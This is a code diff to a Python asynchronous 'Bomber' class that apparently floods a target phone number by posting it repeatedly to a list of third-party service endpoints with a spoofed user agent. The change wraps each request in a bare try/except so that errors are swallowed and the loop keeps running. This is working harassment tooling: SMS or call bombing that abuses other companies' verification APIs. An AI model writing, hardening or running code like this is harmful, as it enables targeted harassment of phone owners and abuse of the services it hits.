@@ -92,42 +92,48 @@ class Bomber:
                 if "json" in list(v.keys()) and not v["format"]:
                     dct = v["json"]
                     dct[v["arg"]] = v["plus"]+phone
-
-                    async with self.session.post(
-                        url=v["url"], 
-                        json=dct,  
-                        headers=self.user_agent
-                    ) as resp:pass
-                    await asyncio.sleep(1) 
+                    try:
+                        async with self.session.post(
+                            url=v["url"], 
+                            json=dct,  
+                            headers=self.user_agent
+                        ) as resp:pass
+                        await asyncio.sleep(1) 
+                    except:pass
 
                 elif "data" in list(v.keys()) and not v["format"]:
                     dct = v["data"]
                     dct[v["arg"]] = v["plus"]+phone
-                    async with self.session.post(
-                        url=v["url"], 
-                        data=dct,  
-                        headers=self.user_agent
-                    ) as resp:pass
-                    await asyncio.sleep(1)
+                    try:
+                        async with self.session.post(
+                            url=v["url"], 
+                            data=dct,  
+                            headers=self.user_agent
+                        ) as resp:pass
+                        await asyncio.sleep(1)
+                    except:pass
                 
                 elif "params" in list(v.keys()) and not v["format"]:
                     dct = v["json"]
                     dct[v["arg"]] = v["plus"]+phone
-
-                    async with self.session.post(
-                        url=v["url"], 
-                        params=dct,  
-                        headers=self.user_agent
-                    ) as resp:pass
-                    await asyncio.sleep(1)
+                    try:
+                        async with self.session.post(
+                            url=v["url"], 
+                            params=dct,  
+                            headers=self.user_agent
+                        ) as resp:pass
+                        await asyncio.sleep(1)
+                    except:pass
 
                 else:
                     url = v["url"].format(phone)
-                    async with self.session.post(
-                        url=url,  
-                        headers=self.user_agent
-                    ) as resp:pass
-                    await asyncio.sleep(1)
+                    try:
+                        async with self.session.post(
+                            url=url,  
+                            headers=self.user_agent
+                        ) as resp:pass
+                        await asyncio.sleep(1)
+                    except:pass
 
             self.circle+=1
             await asyncio.sleep(5)
